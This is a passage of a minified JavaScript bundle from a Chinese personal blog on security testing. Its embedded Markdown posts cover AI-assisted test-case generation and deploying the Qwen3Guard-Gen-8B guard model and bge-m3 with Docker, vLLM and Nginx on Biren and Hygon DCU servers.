"#E59266"},{id:"shopping",iconClass:"iconDesign",color:"#F8A6B2"},{id:"variant",iconClass:"iconMap",color:"#82D5BB",hasNewMessage:!0},{id:"design",iconClass:"iconVariant",color:"#8AC68A"},{id:"map",iconClass:"iconHelicopter",color:"#FC736D"},{id:"chat",iconClass:"iconChat",color:"#D1DA49"}],Y2=({className:e})=>{const[t,r]=ne.useState(new Date);ne.useEffect(()=>{const p=setInterval(()=>{r(new Date)},1e3);return()=>clearInterval(p)},[]);const a=t.getHours(),o=t.getMinutes(),s=a>=12?"PM":"AM",l=a%12||12,h=o.toString().padStart(2,"0");return v.jsx("div",{className:`${ot.phoneContainer} ${e||""}`,children:v.jsx("div",{className:ot.phone,children:v.jsx("div",{className:ot.screenContent,children:v.jsxs("div",{className:ot.homeScreen,children:[v.jsxs("div",{className:ot.dateDisplay,children:[v.jsxs("div",{className:ot.dateDisplayHeader,children:[v.jsx("span",{className:ot.iconWifi}),v.jsxs("div",{children:[l,v.jsx("span",{className:ot.blink,children:":"}),h,s]}),v.jsx("span",{className:ot.iconLocation})]}),v.jsx("div",{className:ot.dayText,children:"Welcome!"})]}),v.jsx("div",{className:ot.appsGrid,children:Q2.map(p=>v.jsxs("div",{className:`${ot.appItem} ${p.offset?ot.appItemOffset:""}`,style:{backgroundColor:p.color},children:[p.hasNewMessage&&v.jsx("span",{className:ot.badge}),v.jsx("span",{className:`${ot.appIcon} ${ot[p.iconClass]} ${p.offset?ot.appIconOffset:""}`})]},p.id))}),v.jsx("div",{className:ot.pageIndicator,children:v.jsx("span",{className:ot.iconPage})})]})})})})},X2="animal-divider-ZBhpE",G2="animal-line-teal-Z80hb",V2="animal-line-white-VDY1E",$2="animal-line-yellow-ifvJz",q2="animal-wave-yellow-AO-io",j0={divider:X2,"line-teal":"animal-line-teal-Z80hb",lineTeal:G2,"line-white":"animal-line-white-VDY1E",lineWhite:V2,"line-yellow":"animal-line-yellow-ifvJz",lineYellow:$2,"wave-yellow":"animal-wave-yellow-AO-io",waveYellow:q2},Ma=({type:e="line-brown",className:t,style:r})=>{const a=[j0.divider,j0[e],t].filter(Boolean).join(" ");return v.jsx("div",{className:a,style:r})};Ma.displayName="Divider";const K2="animal-icon-wUFR-",J2="animal-iconBounce-Q1e3X",Z2="animal-icon-miles-oVFnM",eb="animal-icon-camera-W9x4U",tb="animal-icon-chat-dfYOk",nb="animal-icon-critterpedia-vDPSY",rb="animal-icon-design-8gBms",ib="animal-icon-diy-AwPHs",ab="animal-icon-helicopter-w6ZL6",ub="animal-icon-map-ogQk4",ob="animal-icon-shopping-TSh2U",sb="animal-icon-variant-E6wqy",lb="animal-iconList-MRyTC",cb="animal-iconListItem-nTF3l",db="animal-iconListLabel-t2M3-",vl={icon:K2,"icon-bounce":"animal-icon-bounce-1MvWH",iconBounce:J2,"icon-miles":"animal-icon-miles-oVFnM",iconMiles:Z2,"icon-camera":"animal-icon-camera-W9x4U",iconCamera:eb,"icon-chat":"animal-icon-chat-dfYOk",iconChat:tb,"icon-critterpedia":"animal-icon-critterpedia-vDPSY",iconCritterpedia:nb,"icon-design":"animal-icon-design-8gBms",iconDesign:rb,"icon-diy":"animal-icon-diy-AwPHs",iconDiy:ib,"icon-helicopter":"animal-icon-helicopter-w6ZL6",iconHelicopter:ab,"icon-map":"animal-icon-map-ogQk4",iconMap:ub,"icon-shopping":"animal-icon-shopping-TSh2U",iconShopping:ob,"icon-variant":"animal-icon-variant-E6wqy",iconVariant:sb,iconList:lb,iconListItem:cb,iconListLabel:db},Ir=({name:e,size:t=24,className:r,style:a,bounce:o=!1,...s})=>v.jsx("span",{className:`${vl.icon} ${vl[e]} ${o?vl["icon-bounce"]:""} ${r||""}`,style:{width:t,height:t,...a},...s}),fb="animal-tabs-I3QAo",hb="animal-tabList--fYUP",pb="animal-tabItem-Ehph4",mb="animal-active-AoX4Y",gb="animal-tabIcon-Aiu-T",Eb="animal-tabLabel-bCauA",Tb="animal-tabLeaf-1ud9k",bb="animal-tabLeafStatic-52CX9",_b="animal-tabContent-zDlRq",Sb="animal-tabContentInner-Y5kRC",on={tabs:fb,tabList:hb,tabItem:pb,active:mb,"active-shadow":"animal-active-shadow-vEKIu",tabIcon:gb,tabLabel:Eb,tabLeaf:Tb,tabLeafStatic:bb,tabContent:_b,tabContentInner:Sb},yp=({items:e,defaultActiveKey:t,activeKey:r,onChange:a,className:o,style:s,leafAnimation:l=!0,shadow:h=!0})=>{const[p,g]=ne.useState(t||e[0]?.key),T=r!==void 0?r:p,E=I=>{r===void 0&&g(I),a?.(I)},_=e.find(I=>I.key===T),S=[on.tabs,o].filter(Boolean).join(" ");return v.jsxs("div",{className:S,style:s,children:[v.jsx("div",{className:on.tabList,children:e.map(I=>{const F=I.key===T;return v.jsxs("button",{className:`${on.tabItem} ${F?on.active:""} ${F&&h?on["active-shadow"]:""}`,onClick:()=>E(I.key),children:[v.jsx("span",{className:on.tabIcon,children:F?"●":"○"}),v.jsx("span",{className:on.tabLabel,children:I.label}),F&&v.jsx("img",{src:CT,alt:"",className:`${on.tabLeaf} ${l?"":on.tabLeafStatic}`})]},I.key)})}),v.jsx("div",{className:on.tabContent,children:v.jsx("div",{className:on.tabContentInner,children:_?.children})})]})};yp.displayName="Tabs";var Q0={exports:{}},Y0;function yb(){return Y0||(Y0=1,(function(e){(function(){var t={}.hasOwnProperty;function r(){for(var s="",l=0;l<arguments.length;l++){var h=arguments[l];h&&(s=o(s,a(h)))}return s}function a(s){if(typeof s=="string"||typeof s=="number")return s;if(typeof s!="object")return"";if(Array.isArray(s))return r.apply(null,s);if(s.toString!==Object.prototype.toString&&!s.toString.toString().includes("[native code]"))return s.toString();var l="";for(var h in s)t.call(s,h)&&s[h]&&(l=o(l,h));return l}function o(s,l){return l?s?s+" "+l:s+l:s}e.exports?(r.default=r,e.exports=r):window.classNames=r})()})(Q0)),Q0.exports}yb();function Cb(){return v.jsxs("section",{className:"page-section about-layout",children:[v.jsxs("div",{className:"page-title",children:[v.jsx("span",{className:"eyebrow",children:"About"}),v.jsx("h1",{children:"关于这座岛"}),v.jsx("p",{children:"这里是云飞的技术创作空间，聚焦 Web 应用安全防护、大模型安全防护和软件测试工程实践。"})]}),v.jsxs("div",{className:"about-grid",children:[v.jsxs(Jt,{className:"about-card",children:[v.jsx(Ir,{name:"icon-miles",size:44,bounce:!0}),v.jsx("h2",{children:"软件测试工程师"}),v.jsx("p",{children:"关注安全测试、风险识别、防护验证和质量体系建设。希望把项目中的真实问题沉淀成清晰、可复用的经验。"})]}),v.jsxs(Jt,{className:"about-card",color:"app-teal",children:[v.jsx(Ir,{name:"icon-map",size:44,bounce:!0}),v.jsx("h2",{children:"写作地图"}),v.jsx("p",{children:"目前内容以 Web 应用安全防护、大模型安全防护、测试策略、用例设计和安全质量度量为主。"})]})]}),v.jsx(Ma,{}),v.jsxs("div",{className:"faq-list",children:[v.jsx(lo,{defaultExpanded:!0,question:"这个博客如何新增文章？",answer:"可以在 src/content/posts 下新增单个 Markdown，也可以新建一个文件夹，在文件夹内放 Markdown 和图片资源。"}),v.jsx(lo,{question:"文件夹式文章怎么引用图片？",answer:"在同一个文章文件夹内放图片，然后在 Markdown 中使用相对路径，例如 ![截图](image.png)。"}),v.jsx(lo,{question:"为什么使用 animal-island-ui？",answer:"它提供了统一的圆润卡片、按钮、手机、页脚和光标风格，很适合做一个轻松但完整的个人博客界面。"})]})]})}const xb=`---
title: AI使用分享
date: 2026-05-27
summary: 分享 AI 辅助测试点、测试用例生成和 pytest 回放框架实现过程中的经验与注意事项。
tags: AI, Skills, 测试工程, 大模型安全
cover: app-blue
readingTime: 8 分钟
featured: true
---

# AI使用分享

![背景](背景.png)


![实现的2_Skills](实现的2_Skills.png)

![生成测试点](生成测试点.png) ![生成的测试点](生成的测试点.png)

![生成测试用例](生成测试用例.png)  ![生成的测试用例](生成的测试用例.png)


<!-- ![工作流1](工作流1.png) -->

![价值2](价值2.png)

![注意要点](注意要点.png)

![一点经验](一点经验.png)

![模型对比](模型对比.png)

实例提示词：
\`\`\`
我需要实现一个基于pytest的回放框架，回放样本源在http://10.10.8.250/DEV/LLM/llm_payload/llm_request.zip。里面存在两个文件夹，Black(黑样本)、White（白样本），文件夹里以一个文件为单位，每个文件里有一个完整请求，需要解析并回放；
能够配置回放目标ip 、端口、http/https,
检测到异常，响应会存在“抱歉，您的问题可能涉及敏感内容，无法回答。请更换其他话题。”提示信息
报告需要分别统计每个请求的实际与预期是否相同，需要统计响应码的情况；
包含需要包含json报告和支持jenkins统计的报告
\`\`\`
对比

* MiniMax2.7

![alt text](<Pasted Graphic 2.png>)
![alt text](<Pasted Graphic 4.png>)
![alt text](image.png)

* GPT-5.5

![alt text](<Pasted Graphic 3.png>)
![alt text](<Pasted Graphic 5.png>)
![alt text](<Pasted Graphic 7.png>)
![alt text](<Pasted Graphic 11.png>)

<br>
<br>

# 题外话：订阅chatgpt plus

![订阅](订阅.png)
`,Ab=`---
title: 在壁仞服务器上部署 Qwen3Guard-Gen-8B 与 bge-m3
date: 2026-05-28
summary: 记录在壁仞 8 卡服务器上使用 Docker 和 vLLM 部署 Qwen3Guard-Gen-8B 内容安全模型与 bge-m3 Embedding 模型，并通过 Nginx 暴露 OpenAI 兼容接口的实践过程。
tags: 壁仞服务器, 大模型部署, Qwen3Guard, vLLM, bge-m3
cover: app-teal
readingTime: 12 分钟
featured: true
---

# 在壁仞服务器上部署 Qwen3Guard-Gen-8B 与 bge-m3

这篇文章记录一次在壁仞服务器上部署大模型服务的实践。目标是把内容安全审核模型和 Embedding 模型部署成 OpenAI 兼容接口，并用 Nginx 做统一入口和负载均衡。

本文中的 \`rsguard_v1\` 是本地服务别名，对应的实际开源模型是 \`Qwen3Guard-Gen-8B\`。也就是说：

- 模型能力：\`Qwen3Guard-Gen-8B\`
- 本地模型目录：\`/data/models/rsguard_v1\`
- 容器内模型路径：\`/models/rsguard_v1\`
- vLLM 暴露的服务名：\`rsguard_v1\`
- 对外接口路径：\`/rsguard/v1/chat/completions\`

这样做的好处是可以保持业务侧接口名称稳定，即使后续替换底层 Guard 模型，调用方也不需要频繁改接口路径。

## 部署目标

本次只部署两个模型：

- \`rsguard_v1\`：内容安全 Guard 服务，底层模型为 \`Qwen3Guard-Gen-8B\`，提供 OpenAI Chat Completions 接口。
- \`bge-m3\`：Embedding 服务，提供 OpenAI Embeddings 接口。

基础约定如下：

\`\`\`text
模型根目录：/data/models
容器内模型目录：/models
vLLM 镜像 ID：237020763da3
Qwen3Guard-Gen-8B 本地目录：/data/models/rsguard_v1
bge-m3 本地目录：/data/models/bge-m3
Nginx 对外端口：12002
\`\`\`

最终接口：

\`\`\`text
Qwen3Guard-Gen-8B:
  http://<host>:12002/rsguard/v1/chat/completions

bge-m3:
  http://<host>:12002/bge/v1/embeddings
\`\`\`

## 整体架构

\`\`\`text
Host OS
  -> 安装 BIRENSUPA Driver
  -> 安装 biren-container-toolkit
  -> 加载 vLLM 推理镜像
  -> Docker 容器绑定壁仞设备
  -> 容器内启动 vLLM 服务
  -> Nginx 按路径转发到后端实例
\`\`\`

在 8 卡机器上可以采用两种部署方式：

- \`7 + 1\`：7 个 \`Qwen3Guard-Gen-8B\` 实例，1 个 \`bge-m3\` 实例。
- \`8 + 0\`：8 个 \`Qwen3Guard-Gen-8B\` 实例，不部署 Embedding。

## 环境准备

### 安装驱动

先做安装前检查：

\`\`\`bash
sudo bash biren-driver_<version>.run --check
sudo bash biren-driver_<version>.run --pre-check
\`\`\`

安装驱动：

\`\`\`bash
sudo bash biren-driver_<version>.run
\`\`\`

如果使用当前目录中的安装包，命令示例：

\`\`\`bash
sudo bash biren-driver_br1xx_1.10.1.0.rc1_linux-x86_64.man --check
sudo bash biren-driver_br1xx_1.10.1.0.rc1_linux-x86_64.man --pre-check
sudo bash biren-driver_br1xx_1.10.1.0.rc1_linux-x86_64.man
\`\`\`

### 安装容器工具包

\`\`\`bash
sudo bash biren-container-toolkit_<version>.run --check
sudo bash biren-container-toolkit_<version>.run --pre-check
sudo bash biren-container-toolkit_<version>.run
\`\`\`

如果使用当前目录中的安装包：

\`\`\`bash
sudo bash biren-container-toolkit_br1xx_0.4.0.1.rc1_linux-x86_64.man --check
sudo bash biren-container-toolkit_br1xx_0.4.0.1.rc1_linux-x86_64.man --pre-check
sudo bash biren-container-toolkit_br1xx_0.4.0.1.rc1_linux-x86_64.man
\`\`\`

### 加载 vLLM 镜像

\`\`\`bash
sudo docker load -i birensupa-smartinfer-vllm_<version>.tar
sudo docker images
\`\`\`

确认镜像：

\`\`\`bash
sudo docker images | grep -i vllm
\`\`\`

本文使用镜像 ID：

\`\`\`text
237020763da3
\`\`\`

### 准备模型目录

\`\`\`bash
sudo mkdir -p /data/models
\`\`\`

模型目录建议保持如下结构：

\`\`\`text
/data/models
├── rsguard_v1   # Qwen3Guard-Gen-8B
└── bge-m3
\`\`\`

检查目录：

\`\`\`bash
ls -lh /data/models/rsguard_v1
ls -lh /data/models/bge-m3
\`\`\`

## Host 侧检查

检查设备节点：

\`\`\`bash
ls -l /dev/biren*
ls -l /dev/biren/
\`\`\`

多卡环境应能看到：

\`\`\`text
/dev/biren-m
/dev/biren/card_0
/dev/biren/card_1
...
\`\`\`

查看设备状态：

\`\`\`bash
brsmi
\`\`\`

如果这里看不到卡，优先排查驱动、设备权限和容器工具包，不要直接进入模型启动阶段。

## 单实例部署

单实例适合先验证模型、镜像、设备映射和 vLLM 参数是否可用。

### 启动 Qwen3Guard-Gen-8B 服务

创建容器：

\`\`\`bash
sudo docker run -itd \\
  --name rsguard \\
  --device /dev/biren-m \\
  --device /dev/biren/card_0:/dev/biren/card_0 \\
  -v /data/models:/models \\
  --net host \\
  --shm-size 64gb \\
  --ulimit memlock=-1 \\
  --ulimit nofile=1048576 \\
  --cap-add=SYSLOG \\
  --cap-add=IPC_LOCK \\
  237020763da3 \\
  /bin/bash
\`\`\`

进入容器：

\`\`\`bash
sudo docker exec -it rsguard bash
\`\`\`

容器内启动 vLLM：

\`\`\`bash
VLLM_USE_V1=1 \\
VLLM_WORKER_MULTIPROC_METHOD=spawn \\
VLLM_BR_WEIGHT_TYPE=NUMA \\
nohup vllm serve /models/rsguard_v1 \\
  --host 0.0.0.0 \\
  --port 28900 \\
  --trust-remote-code \\
  --dtype auto \\
  --served-model-name rsguard_v1 \\
  --kv-cache-dtype auto \\
  --distributed-executor-backend mp \\
  --tensor-parallel-size 1 \\
  --pipeline-parallel-size 1 \\
  --data-parallel-size 1 \\
  --max-model-len 32768 \\
  --gpu-memory-utilization 0.75 \\
  --max-num-seqs 32 \\
  --enable-chunked-prefill \\
  --compilation-config '{"cudagraph_mode": "FULL_DECODE_ONLY"}' \\
  > rsguard.log 2>&1 &
\`\`\`

这里的 \`--served-model-name rsguard_v1\` 是接口侧看到的模型名。虽然底层模型是 \`Qwen3Guard-Gen-8B\`，但请求体仍然使用：

\`\`\`json
{"model": "rsguard_v1"}
\`\`\`

验证接口：

\`\`\`bash
curl http://127.0.0.1:28900/v1/chat/completions \\
  -H "Content-Type: application/json" \\
  -d '{
    "model": "rsguard_v1",
    "messages": [{"role": "user", "content": "你好"}],
    "max_tokens": 128,
    "temperature": 0
  }'
\`\`\`

### 启动 bge-m3 服务

创建容器：

\`\`\`bash
sudo docker run -itd \\
  --name bge \\
  --device /dev/biren-m \\
  --device /dev/biren/card_1:/dev/biren/card_0 \\
  -v /data/models:/models \\
  --net host \\
  --shm-size 64gb \\
  --ulimit memlock=-1 \\
  --ulimit nofile=1048576 \\
  --cap-add=SYSLOG \\
  --cap-add=IPC_LOCK \\
  237020763da3 \\
  /bin/bash
\`\`\`

进入容器：

\`\`\`bash
sudo docker exec -it bge bash
\`\`\`

容器内启动 vLLM：

\`\`\`bash
VLLM_USE_V1=1 \\
VLLM_WORKER_MULTIPROC_METHOD=spawn \\
VLLM_USE_TRITON_FLASH_ATTN=0 \\
BRTB_ENABLE_NUMA_SPLIT=1 \\
BRTB_ENABLE_NUMA_ALIGN_4K=1 \\
nohup vllm serve /models/bge-m3 \\
  --host 0.0.0.0 \\
  --port 28910 \\
  --task embed \\
  --trust-remote-code \\
  --dtype bfloat16 \\
  --max-model-len 8192 \\
  --served-model-name bge-m3 \\
  --enforce-eager \\
  --pipeline-parallel-size 1 \\
  --tensor-parallel-size 1 \\
  --data-parallel-size 1 \\
  --gpu-memory-utilization 0.75 \\
  --kv-cache-dtype auto \\
  --max-num-seqs 32 \\
  > bge.log 2>&1 &
\`\`\`

验证接口：

\`\`\`bash
curl http://127.0.0.1:28910/v1/embeddings \\
  -H "Content-Type: application/json" \\
  -d '{
    "model": "bge-m3",
    "input": "hello"
  }'
\`\`\`

## 多实例部署

### 7 个 Qwen3Guard-Gen-8B + 1 个 bge-m3

这个方案适合需要 Guard 服务高并发，同时保留一个 Embedding 服务的场景：

- \`card_0\` 到 \`card_6\`：部署 7 个 \`Qwen3Guard-Gen-8B\` 实例。
- \`card_7\`：部署 1 个 \`bge-m3\` 实例。
- Guard 后端端口：\`28900-28906\`。
- Embedding 后端端口：\`28910\`。

启动脚本：

\`\`\`bash
bash 7_1.sh
\`\`\`

脚本核心逻辑是循环绑定不同壁仞卡，并在每个容器内启动一个 vLLM 实例：

\`\`\`bash
MODEL_DIR="/data/models"
IMAGE="237020763da3"

for i in 0 1 2 3 4 5 6
do
  PORT=$((28900 + i))
  NAME="rsguard-\${i}"

  sudo docker run -itd \\
    --name \${NAME} \\
    --device /dev/biren-m \\
    --device /dev/biren/card_\${i}:/dev/biren/card_0 \\
    -v \${MODEL_DIR}:/models \\
    --net host \\
    --shm-size 64gb \\
    --ulimit memlock=-1 \\
    --ulimit nofile=1048576 \\
    --cap-add=SYSLOG \\
    --cap-add=IPC_LOCK \\
    \${IMAGE} \\
    /bin/bash -lc "
      VLLM_USE_V1=1 \\
      VLLM_WORKER_MULTIPROC_METHOD=spawn \\
      VLLM_BR_WEIGHT_TYPE=NUMA \\
      nohup vllm serve /models/rsguard_v1 \\
        --host 0.0.0.0 \\
        --port \${PORT} \\
        --trust-remote-code \\
        --dtype auto \\
        --served-model-name rsguard_v1 \\
        --max-model-len 16384 \\
        --gpu-memory-utilization 0.85 \\
        --max-num-seqs 32 \\
        --enable-chunked-prefill \\
        --compilation-config '{\\"cudagraph_mode\\": \\"FULL_DECODE_ONLY\\"}' \\
        > /workspace/rsguard_\${PORT}.log 2>&1 &

      tail -f /dev/null
    "
done
\`\`\`

### 8 个 Qwen3Guard-Gen-8B

如果只需要内容安全审核能力，可以 8 张卡全部部署 Guard 模型：

- \`card_0\` 到 \`card_7\`：部署 8 个 \`Qwen3Guard-Gen-8B\` 实例。
- 后端端口：\`28900-28907\`。
- 不部署 \`bge-m3\`。

启动脚本：

\`\`\`bash
bash 8_vllm.sh
\`\`\`

这种模式下，Nginx 中需要删除或注释 \`bge_backend\` 和 \`/bge/\` location，避免暴露不可用接口。

## Nginx 统一入口

Nginx 使用一个对外端口 \`12002\`，通过路径前缀区分模型服务：

\`\`\`text
/rsguard/ -> Qwen3Guard-Gen-8B 后端池
/bge/     -> bge-m3 后端池
\`\`\`

关键点是通过 \`rewrite\` 去掉路径前缀，再转发给 vLLM 的原生 OpenAI 兼容路径。

### 完整配置示例

编辑配置：

\`\`\`bash
sudo vi /etc/nginx/nginx.conf
\`\`\`

示例配置：

\`\`\`nginx
worker_processes auto;

events {
    worker_connections 10240;
}

http {
    upstream rsguard_backend {
        server 127.0.0.1:28900;
        server 127.0.0.1:28901;
        server 127.0.0.1:28902;
        server 127.0.0.1:28903;
        server 127.0.0.1:28904;
        server 127.0.0.1:28905;
        server 127.0.0.1:28906;
        server 127.0.0.1:28907;

        keepalive 128;
    }

    upstream bge_backend {
        least_conn;

        server 127.0.0.1:28910;
        server 127.0.0.1:28911;
        server 127.0.0.1:28912;

        keepalive 64;
    }

    server {
        listen 12002;

        client_max_body_size 100m;

        proxy_connect_timeout 600s;
        proxy_send_timeout 600s;
        proxy_read_timeout 600s;

        location /rsguard/ {
            rewrite ^/rsguard/(.*)$ /$1 break;
            proxy_pass http://rsguard_backend;
            proxy_http_version 1.1;
            proxy_set_header Host $host;
            proxy_set_header Connection "";
            proxy_buffering off;
        }

        location /bge/ {
            rewrite ^/bge/(.*)$ /$1 break;
            proxy_pass http://bge_backend;
            proxy_http_version 1.1;
            proxy_set_header Host $host;
            proxy_set_header Connection "";
            proxy_buffering off;
        }
    }
}
\`\`\`

检查并重载：

\`\`\`bash
sudo nginx -t
sudo systemctl reload nginx
\`\`\`

### 按实际实例裁剪 upstream

如果运行的是 \`7 + 1\` 方案，Guard 只保留 \`28900-28906\`，bge 只保留 \`28910\`：

\`\`\`nginx
upstream rsguard_backend {
    server 127.0.0.1:28900;
    server 127.0.0.1:28901;
    server 127.0.0.1:28902;
    server 127.0.0.1:28903;
    server 127.0.0.1:28904;
    server 127.0.0.1:28905;
    server 127.0.0.1:28906;
    keepalive 128;
}

upstream bge_backend {
    server 127.0.0.1:28910;
    keepalive 64;
}
\`\`\`

如果运行的是 \`8 + 0\` 方案，只保留 Guard 后端，删除 bge 相关配置：

\`\`\`nginx
upstream rsguard_backend {
    server 127.0.0.1:28900;
    server 127.0.0.1:28901;
    server 127.0.0.1:28902;
    server 127.0.0.1:28903;
    server 127.0.0.1:28904;
    server 127.0.0.1:28905;
    server 127.0.0.1:28906;
    server 127.0.0.1:28907;
    keepalive 128;
}
\`\`\`

## 接口验证

### 验证 Qwen3Guard-Gen-8B

\`\`\`bash
curl http://127.0.0.1:12002/rsguard/v1/chat/completions \\
  -H "Content-Type: application/json" \\
  -d '{
    "model": "rsguard_v1",
    "messages": [{"role": "user", "content": "你好"}],
    "max_tokens": 128,
    "temperature": 0
  }'
\`\`\`

### 验证 bge-m3

\`\`\`bash
curl http://127.0.0.1:12002/bge/v1/embeddings \\
  -H "Content-Type: application/json" \\
  -d '{
    "model": "bge-m3",
    "input": "hello"
  }'
\`\`\`

### 查看模型列表

\`\`\`bash
curl http://127.0.0.1:12002/rsguard/v1/models
curl http://127.0.0.1:12002/bge/v1/models
\`\`\`

如果模型列表返回的模型名是 \`rsguard_v1\`，说明 \`--served-model-name\` 生效。业务请求中的 \`model\` 字段也要保持一致。

## 运维操作

### 查看容器

\`\`\`bash
docker ps
\`\`\`

### 查看容器日志

\`\`\`bash
docker logs rsguard-0 --tail 100
docker logs bge-0 --tail 100
\`\`\`

进入容器查看 vLLM 日志：

\`\`\`bash
docker exec -it rsguard-0 bash
tail -f /workspace/rsguard_28900.log

docker exec -it bge-0 bash
tail -f /workspace/bge_28910.log
\`\`\`

### 查看 Nginx 日志

\`\`\`bash
sudo tail -f /var/log/nginx/access.log
sudo tail -f /var/log/nginx/error.log
\`\`\`

### 检查端口

\`\`\`bash
ss -lntp | grep 28900
ss -lntp | grep 28910
ss -lntp | grep 12002
\`\`\`

### 清理容器

下面命令会删除匹配名称的容器，执行前确认没有误删：

\`\`\`bash
docker ps -a --format '{{.Names}}' | grep -E 'rsguard|bge' | xargs -r docker rm -f
\`\`\`

### 重启服务

\`\`\`bash
bash 7_1.sh
# 或
bash 8_vllm.sh

sudo nginx -t
sudo systemctl reload nginx
\`\`\`

## 常见问题

### 容器内看不到设备

重点检查：

- Host 侧驱动是否安装成功。
- \`/dev/biren-m\` 和 \`/dev/biren/card_<N>\` 是否存在。
- \`docker run\` 是否添加了正确的 \`--device\`。
- 容器工具包是否安装成功。

### vLLM 服务启动后接口不通

重点检查：

- \`--host\` 是否为 \`0.0.0.0\`。
- \`--port\` 是否和 curl 端口一致。
- Docker 是否使用 \`--net host\`。
- 日志中是否有模型加载失败、显存不足或端口占用。

### Nginx 返回 502

常见原因：

- 后端 vLLM 端口未监听。
- 容器已经退出。
- Nginx upstream 中配置了未启动的端口。
- \`7 + 1\` 场景下未删除 \`28907\`、\`28911\`、\`28912\` 等不存在的后端。

### Nginx 返回 504

模型推理时间超过 Nginx 超时配置。可以先确认：

\`\`\`nginx
proxy_connect_timeout 600s;
proxy_send_timeout 600s;
proxy_read_timeout 600s;
\`\`\`

如果仍然超时，需要降低请求长度、降低并发或增加后端实例。

### bge-m3 启动异常

确认是否设置了 Embedding 相关参数：

\`\`\`bash
VLLM_USE_TRITON_FLASH_ATTN=0
BRTB_ENABLE_NUMA_SPLIT=1
BRTB_ENABLE_NUMA_ALIGN_4K=1
--task embed
--dtype bfloat16
--enforce-eager
\`\`\`

### model 字段不匹配

请求体中的 \`model\` 字段必须与服务端 \`--served-model-name\` 一致。

Guard 服务应使用：

\`\`\`json
{"model": "rsguard_v1"}
\`\`\`

Embedding 服务应使用：

\`\`\`json
{"model": "bge-m3"}
\`\`\`

如果你希望外部直接使用 \`Qwen3Guard-Gen-8B\` 作为 model 名，需要同步修改 vLLM 启动参数：

\`\`\`bash
--served-model-name Qwen3Guard-Gen-8B
\`\`\`

同时所有调用方也要把请求体中的 \`model\` 改成 \`Qwen3Guard-Gen-8B\`。不建议在已经接入业务后随意变更。

## 上线检查清单

1. 驱动和容器工具包安装成功。
2. \`brsmi\` 可正常查看设备。
3. \`/data/models/rsguard_v1\` 路径存在，内容为 \`Qwen3Guard-Gen-8B\` 模型文件。
4. \`/data/models/bge-m3\` 路径存在。
5. Docker 镜像 \`237020763da3\` 可用。
6. Guard 后端端口可访问。
7. bge-m3 后端端口可访问。
8. Nginx \`12002\` 端口可访问。
9. Nginx upstream 只保留实际启动的后端端口。
10. \`/rsguard/v1/chat/completions\` 验证通过。
11. \`/bge/v1/embeddings\` 验证通过。

## 小结

这次部署的核心不是单纯把模型跑起来，而是把模型、服务别名、接口路径和负载均衡关系整理清楚。

\`rsguard_v1\` 在这套系统中是一个稳定服务名，背后实际承载的是 \`Qwen3Guard-Gen-8B\`。对外保持 \`rsguard_v1\`，可以降低业务侧改造成本；在文档中明确它和开源模型的对应关系，则能避免后续维护时把服务名和模型名混淆。

`,Lb=`---
title: 在海光 DCU 服务器上部署 Qwen3Guard-Gen-8B、bge-m3 与 Qwen
date: 2026-05-28
summary: 记录在海光 DCU 环境中使用 Docker 和 vLLM 部署内容安全模型、Embedding 模型和通用大模型的实践，并整理日常巡检、接口验证和常见故障处理方法。
tags: 海光DCU, 大模型部署, Qwen3Guard, vLLM, bge-m3
cover: app-blue
readingTime: 10 分钟
featured: true
---

# 在海光 DCU 服务器上部署 Qwen3Guard-Gen-8B、bge-m3 与 Qwen

这篇文章整理一次在海光 DCU 服务器上部署大模型服务的实践。目标是把内容安全审核、文本向量化和通用问答能力分别部署成 OpenAI 兼容接口，方便业务系统通过统一协议调用。

其中需要特别说明的是：本文中的 \`rsguard_v1\` 是本地服务别名，它对应的实际开源模型是 \`Qwen3Guard-Gen-8B\`。

也就是说：

- 模型能力：\`Qwen3Guard-Gen-8B\`
- 本地模型目录：\`/home/ubuntu/models/rsguard_v1\`
- 容器内模型路径：\`/data/rsguard_v1/rsguard_v1\`
- vLLM 暴露的服务名：\`rsguard:v1\`
- 接口类型：OpenAI Chat Completions

这里保留 \`rsguard:v1\` 作为请求体中的 \`model\` 名，是为了让业务侧使用稳定的服务名。底层模型可以明确记录为 \`Qwen3Guard-Gen-8B\`，但调用方不必直接感知模型文件目录和模型来源。

## 设备概览

本次部署环境如下：

| 项目 | 配置 |
| --- | --- |
| 设备 IP | \`10.6.69.241\` |
| 操作系统 | Ubuntu Linux |
| 内核版本 | \`5.15.0-177-generic\` |
| CPU 架构 | \`x86_64\` |
| CPU 型号 | Hygon C86 7390 32-core Processor |
| CPU 规格 | 2 Socket，每 Socket 32 Core，每 Core 2 Thread，共 128 逻辑 CPU |
| NUMA 节点 | 8 个 NUMA 节点 |
| 内存 | 251 GiB |
| Swap | 8 GiB |
| DCU 数量 | 2 张 |

查看 CPU 信息：

\`\`\`bash
lscpu
\`\`\`

查看内存：

\`\`\`bash
free -h
\`\`\`

查看 DCU：

\`\`\`bash
hy-smi
\`\`\`

日常重点关注 \`Temp\`、\`VRAM%\`、\`DCU%\` 和设备状态。如果显存长期接近 100%，后续启动新模型或提高上下文长度时很容易触发 OOM。

## 模型与服务规划

本次服务器上维护三个服务：

| 服务 | 容器名 | 模型能力 | 服务模型名 | 端口 | 接口 |
| --- | --- | --- | --- | --- | --- |
| bge-m3 向量模型 | \`bge-m3\` | Embedding | \`bge-m3\` | \`20195\` | \`/v1/embeddings\` |
| 内容安全模型 | \`rsguard-v1\` | Qwen3Guard-Gen-8B | \`rsguard:v1\` | \`20197\` | \`/v1/chat/completions\` |
| Qwen 通用大模型 | \`qwen3.5-4B\` | Qwen 通用问答 | \`Qwen3_6:35BA3B\` | \`20198\` | \`/v1/chat/completions\` |

访问地址：

\`\`\`text
http://10.6.69.241:20195/v1/embeddings
http://10.6.69.241:20197/v1/chat/completions
http://10.6.69.241:20198/v1/chat/completions
\`\`\`

模型目录：

| 模型 | 存储路径 |
| --- | --- |
| bge-m3 | \`/home/ubuntu/models/bge-m3\` |
| Qwen3Guard-Gen-8B | \`/home/ubuntu/models/rsguard_v1\` |
| Qwen 系列 | \`/home/ubuntu/.cache/modelscope/hub/models/Qwen/\` |

## 日常巡检

### 系统状态

\`\`\`bash
uname -a
uptime
free -h
df -h
\`\`\`

重点看三类问题：

- 内存可用量是否充足。
- 根分区、模型目录所在分区是否接近写满。
- 系统负载是否长期高于 CPU 核数。

### DCU 状态

\`\`\`bash
hy-smi
\`\`\`

关注项：

- \`Temp\` 温度是否异常升高。
- \`VRAM%\` 是否长期接近 100%。
- \`DCU%\` 是否符合业务调用情况。
- 设备状态是否为 \`Normal\`。

### 容器状态

\`\`\`bash
docker ps
docker stats
\`\`\`

查看日志：

\`\`\`bash
docker logs --tail 200 bge-m3
